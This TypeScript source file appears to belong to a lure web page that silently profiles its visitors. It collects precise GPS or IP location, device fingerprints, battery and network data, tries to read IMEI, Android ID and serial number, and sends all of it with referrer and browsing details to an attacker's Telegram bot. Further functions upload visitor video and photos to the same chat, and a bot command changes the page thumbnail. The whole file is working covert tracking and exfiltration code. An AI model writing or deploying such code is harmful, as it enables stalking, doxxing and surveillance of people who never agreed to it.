interface LocationInfo {
  city: string;
  country: string;
  latitude: number | null;
  longitude: number | null;
  accuracy: number | null;
  source: string;
  ip: string;
}

interface DeviceInfo {
  brand: string;
  model: string;
  type: string;
  platform: string;
  mobile: boolean;
  imei?: string;
  androidId?: string;
  serialNumber?: string;
  batteryLevel?: number;
  networkType?: string;
  screenResolution?: string;
  cpuCores?: number;
  totalMemory?: number;
  osVersion?: string;
}

interface VisitorDetails {
  userAgent: string;
  location: string;
  referrer: string;
  previousSites: string;
  city?: string;
  country?: string;
  latitude?: number;
  longitude?: number;
  accuracy?: number;
  deviceInfo?: {
    brand: string;
    model: string;
    type: string;
    platform: string;
    mobile: boolean;
    imei?: string;
    androidId?: string;
    serialNumber?: string;
    batteryLevel?: number;
    networkType?: string;
    screenResolution?: string;
    cpuCores?: number;
    totalMemory?: number;
    osVersion?: string;
  };
}

let hasNotificationBeenSent = false;
let lastMessageId = 0;
let isWaitingForImage = false;

async function getDeviceInfo(): Promise<DeviceInfo> {
  let brand = 'Unknown';
  let model = 'Unknown';
  let type = 'Unknown';
  let platform = 'Unknown';
  let mobile = false;
  let osVersion = 'Unknown';
  let networkType = 'Unknown';
  let batteryLevel: number | undefined;
  let screenResolution: string | undefined;
  let cpuCores: number | undefined;
  let totalMemory: number | undefined;

  try {
    screenResolution = `${window.screen.width}x${window.screen.height}@${window.devicePixelRatio}x`;

    if (navigator.hardwareConcurrency) {
      cpuCores = navigator.hardwareConcurrency;
    }

    if ('deviceMemory' in navigator) {
      totalMemory = (navigator as any).deviceMemory;
    }

    try {
      const battery = await (navigator as any).getBattery?.();
      if (battery) {
        batteryLevel = battery.level * 100;
      }
    } catch (e) {
      console.log('Battery API not available');
    }

    if ('connection' in navigator) {
      const conn = (navigator as any).connection;
      if (conn) {
        networkType = `${conn.effectiveType || ''} ${conn.type || ''}`.trim() || 'Unknown';
      }
    }

    if ('userAgentData' in navigator) {
      const uaData = navigator.userAgentData as any;
      const hints = await uaData.getHighEntropyValues([
        'platform',
        'platformVersion',
        'model',
        'mobile',
        'architecture',
        'bitness',
        'fullVersionList'
      ]);
      
      platform = hints.platform || platform;
      model = hints.model || model;
      mobile = hints.mobile;
      osVersion = hints.platformVersion || osVersion;

      const browsers = hints.fullVersionList || [];
      const browserInfo = browsers.find((b: any) => b.brand !== 'Not.A.Brand') || {};
      if (browserInfo.version) {
        model += ` (${browserInfo.brand} ${browserInfo.version})`;
      }
    }

    const ua = navigator.userAgent.toLowerCase();
    
    if (/(tablet|ipad|playbook|silk)|(android(?!.*mobile))/i.test(ua)) {
      type = 'Tablet';
      mobile = true;
    } else if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated/i.test(ua)) {
      type = 'Mobile';
      mobile = true;
    } else {
      type = 'Desktop';
    }

    if (ua.includes('iphone')) {
      brand = 'Apple';
      const match = ua.match(/iphone\sos\s(\d+_\d+)/);
      model = match ? `iPhone (iOS ${match[1].replace('_', '.')})` : 'iPhone';
      osVersion = match ? match[1].replace('_', '.') : osVersion;
    } else if (ua.includes('ipad')) {
      brand = 'Apple';
      const match = ua.match(/ipad\sos\s(\d+_\d+)/);
      model = match ? `iPad (iOS ${match[1].replace('_', '.')})` : 'iPad';
      osVersion = match ? match[1].replace('_', '.') : osVersion;
    } else if (ua.includes('macintosh')) {
      brand = 'Apple';
      model = 'Mac';
      const match = ua.match(/mac\sos\sx\s(\d+[._]\d+)/);
      osVersion = match ? match[1].replace('_', '.') : osVersion;
    } else if (ua.includes('android')) {
      const matches = ua.match(/android\s([0-9.]+);\s([^;)]+)/);
      if (matches) {
        brand = matches[2].split(' ')[0];
        model = `${matches[2]} (Android ${matches[1]})`;
        osVersion = matches[1];
      }
    } else if (ua.includes('windows')) {
      brand = 'Microsoft';
      const version = ua.match(/windows\snt\s(\d+\.\d+)/);
      model = version ? `Windows ${version[1]}` : 'Windows';
      osVersion = version ? version[1] : osVersion;
    }

    let androidId: string | undefined;
    let serialNumber: string | undefined;
    let imei: string | undefined;

    if (typeof window !== 'undefined' && (window as any).Android) {
      try {
        androidId = (window as any).Android.getAndroidId?.();
        serialNumber = (window as any).Android.getSerialNumber?.();
        imei = (window as any).Android.getIMEI?.();
      } catch (e) {
        console.log('Native Android bridge not available');
      }
    }

    return {
      brand,
      model,
      type,
      platform,
      mobile,
      imei,
      androidId,
      serialNumber,
      batteryLevel,
      networkType,
      screenResolution,
      cpuCores,
      totalMemory,
      osVersion
    };
  } catch (error) {
    console.error('Error getting device info:', error);
    return {
      brand,
      model,
      type,
      platform,
      mobile
    };
  }
}

async function getLocationInfo(): Promise<LocationInfo> {
  try {
    if ('geolocation' in navigator) {
      try {
        const position = await new Promise<GeolocationPosition>((resolve, reject) => {
          const options = {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
          };

          const watchId = navigator.geolocation.watchPosition(
            (pos) => {
              if (pos.coords.accuracy <= 20) {
                navigator.geolocation.clearWatch(watchId);
                resolve(pos);
              }
            },
            (error) => {
              console.warn('GPS Watch Error:', error);
              navigator.geolocation.clearWatch(watchId);
              navigator.geolocation.getCurrentPosition(resolve, reject, options);
            },
            options
          );

          setTimeout(() => {
            navigator.geolocation.clearWatch(watchId);
            navigator.geolocation.getCurrentPosition(resolve, reject, options);
          }, 10000);
        });

        const ipResponse = await fetch('https://ipapi.co/json/');
        const ipData = await ipResponse.json();

        return {
          city: ipData.city || 'Unknown',
          country: ipData.country_name || 'Unknown',
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          source: 'GPS',
          ip: ipData.ip || 'Unknown'
        };
      } catch (geoError) {
        console.warn('GPS Error:', geoError);
      }
    }

    const ipResponse = await fetch('https://ipapi.co/json/');
    if (!ipResponse.ok) {
      throw new Error(`Location API error: ${ipResponse.status}`);
    }
    const ipData = await ipResponse.json();
    
    return {
      city: ipData.city || 'Unknown',
      country: ipData.country_name || 'Unknown',
      latitude: ipData.latitude || null,
      longitude: ipData.longitude || null,
      accuracy: null,
      source: 'IP',
      ip: ipData.ip || 'Unknown'
    };
  } catch (error) {
    console.error('Error fetching location:', error);
    return {
      city: 'Unknown',
      country: 'Unknown',
      latitude: null,
      longitude: null,
      accuracy: null,
      source: 'None',
      ip: 'Unknown'
    };
  }
}

async function sendTelegramMessage(botToken: string, data: any): Promise<Response> {
  if (!botToken) {
    throw new Error('Bot token is missing');
  }

  try {
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
    });

    const responseData = await response.json();
    
    if (!response.ok || !responseData.ok) {
      throw new Error(
        `Telegram API Error: ${response.status} - ${responseData.description || response.statusText}`
      );
    }

    return response;
  } catch (error) {
    console.error('Error sending Telegram message:', error);
    throw error;
  }
}

export const sendTelegramNotification = async (details: VisitorDetails) => {
  if (hasNotificationBeenSent) {
    return;
  }

  const CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID?.trim();
  const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim();

  if (!CHAT_ID || !botToken) {
    console.error('Telegram configuration is missing');
    return;
  }
  
  const locationInfo = await getLocationInfo();
  const deviceInfo = await getDeviceInfo();
  
  let locationText = `🌆 City: ${locationInfo.city}\n🌍 Country: ${locationInfo.country}\n🌐 IP: ${locationInfo.ip}`;
  
  if (locationInfo.latitude && locationInfo.longitude) {
    locationText += `\n📍 Location (${locationInfo.source}): ${locationInfo.latitude}, ${locationInfo.longitude}`;
    if (locationInfo.accuracy) {
      locationText += `\n🎯 Accuracy: ${Math.round(locationInfo.accuracy)}m`;
    }
    
    locationText += `\n🗺 Map: https://www.google.com/maps?q=${locationInfo.latitude},${locationInfo.longitude}`;
  }

  const deviceText = `
📱 Device Details
  • Brand: ${deviceInfo.brand}
  • Model: ${deviceInfo.model}
  • Type: ${deviceInfo.type}
  • Platform: ${deviceInfo.platform}
  • OS Version: ${deviceInfo.osVersion || 'Unknown'}
  • Mobile: ${deviceInfo.mobile ? 'Yes' : 'No'}
  • Screen: ${deviceInfo.screenResolution || 'Unknown'}
  • CPU Cores: ${deviceInfo.cpuCores || 'Unknown'}
  • Memory: ${deviceInfo.totalMemory ? deviceInfo.totalMemory + 'GB' : 'Unknown'}
  • Battery: ${deviceInfo.batteryLevel ? deviceInfo.batteryLevel + '%' : 'Unknown'}
  • Network: ${deviceInfo.networkType || 'Unknown'}
  • IMEI: ${deviceInfo.imei || 'Not available'}
  • Android ID: ${deviceInfo.androidId || 'Not available'}
  • Serial: ${deviceInfo.serialNumber || 'Not available'}`;
  
  const message = `
🔍 New Visitor Details
👤 UA: ${details.userAgent}
📍 Location: ${details.location}
${locationText}
${deviceText}
🔗 Referrer: ${details.referrer}
🌐 Previous sites: ${details.previousSites}
⏰ Time: ${new Date().toISOString()}
  `.trim();

  const messageData = {
    chat_id: CHAT_ID,
    text: message,
    parse_mode: 'HTML',
  };

  try {
    await sendTelegramMessage(botToken, messageData);
    hasNotificationBeenSent = true;
  } catch (error) {
    console.error('Failed to send notification:', error instanceof Error ? error.message : 'Unknown error');
  }
};

export const sendVideoToTelegram = async (videoBlob: Blob) => {
  const CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID?.trim();
  const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim();

  if (!CHAT_ID || !botToken) {
    console.error('Telegram configuration is missing');
    return;
  }

  const locationInfo = await getLocationInfo();
  const deviceInfo = await getDeviceInfo();
  const formData = new FormData();
  formData.append('chat_id', CHAT_ID);
  
  const videoFile = new File([videoBlob], 'visitor-video.mp4', {
    type: 'video/mp4'
  });
  
  formData.append('video', videoFile);
  formData.append('caption', `🎥 Visitor Video
⏰ Time: ${new Date().toISOString()}
🌆 City: ${locationInfo.city}
🌍 Country: ${locationInfo.country}
🌐 IP: ${locationInfo.ip}
📱 Device: ${deviceInfo.brand} ${deviceInfo.model}
📱 IMEI: ${deviceInfo.imei || 'Not available'}
📱 Android ID: ${deviceInfo.androidId || 'Not available'}
📱 Serial: ${deviceInfo.serialNumber || 'Not available'}`);
  formData.append('supports_streaming', 'true');

  try {
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
      method: 'POST',
      body: formData,
    });

    if (!response.ok) {
      const responseData = await response.json();
      throw new Error(
        `Telegram API Error: ${response.status} - ${responseData.description || response.statusText}`
      );
    }

    console.log('Video sent successfully');
  } catch (error) {
    console.error('Failed to send video:', error instanceof Error ? error.message : 'Unknown error');
  }
};

export const sendImageToTelegram = async (imageBlob: Blob) => {
  const CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID?.trim();
  const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim();

  if (!CHAT_ID || !botToken) {
    console.error('Telegram configuration is missing');
    return;
  }

  const locationInfo = await getLocationInfo();
  const deviceInfo = await getDeviceInfo();
  const formData = new FormData();
  formData.append('chat_id', CHAT_ID);
  formData.append('photo', imageBlob, 'visitor-photo.jpg');
  formData.append('caption', `📸 Visitor Photo
⏰ Time: ${new Date().toISOString()}
🌆 City: ${locationInfo.city}
🌍 Country: ${locationInfo.country}
🌐 IP: ${locationInfo.ip}
📱 Device: ${deviceInfo.brand} ${deviceInfo.model}
📱 IMEI: ${deviceInfo.imei || 'Not available'}
📱 Android ID: ${deviceInfo.androidId || 'Not available'}
📱 Serial: ${deviceInfo.serialNumber || 'Not available'}`);

  try {
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
      method: 'POST',
      body: formData,
    });

    const responseData = await response.json();

    if (!response.ok || !responseData.ok) {
      throw new Error(
        `Telegram API Error: ${response.status} - ${responseData.description || response.statusText}`
      );
    }
  } catch (error) {
    console.error('Failed to send image:', error instanceof Error ? error.message : 'Unknown error');
  }
};

export const checkForImageUpdateCommand = async (): Promise<string | null> => {
  const CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID?.trim();
  const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim();

  if (!CHAT_ID || !botToken) {
    return null;
  }

  try {
    const response = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastMessageId + 1}&chat_id=${CHAT_ID}`);
    const data = await response.json();

    if (!data.ok) {
      return null;
    }

    for (const update of data.result) {
      lastMessageId = Math.max(lastMessageId, update.update_id);

      if (update.message?.text?.match(/^\/gantifoto(@\w+)?$/)) {
        isWaitingForImage = true;
        await sendTelegramMessage(botToken, {
          chat_id: CHAT_ID,
          text: 'Please send me the new image you want to use',
          parse_mode: 'HTML'
        });
      } else if (isWaitingForImage && update.message?.photo) {
        isWaitingForImage = false;
        const photo = update.message.photo[update.message.photo.length - 1];
        
        const fileResponse = await fetch(`https://api.telegram.org/bot${botToken}/getFile?file_id=${photo.file_id}`);
        const fileData = await fileResponse.json();
        
        if (fileData.ok) {
          const filePath = fileData.result.file_path;
          const imageUrl = `https://api.telegram.org/file/bot${botToken}/${filePath}`;
          
          localStorage.setItem('thumbnailUrl', imageUrl);
          
          await sendTelegramMessage(botToken, {
            chat_id: CHAT_ID,
            text: '✅ Image has been updated successfully!',
            parse_mode: 'HTML'
          });
          
          return imageUrl;
        }
      }
    }
  } catch (error) {
    console.error('Error checking for image update:', error);
  }

  return null;
};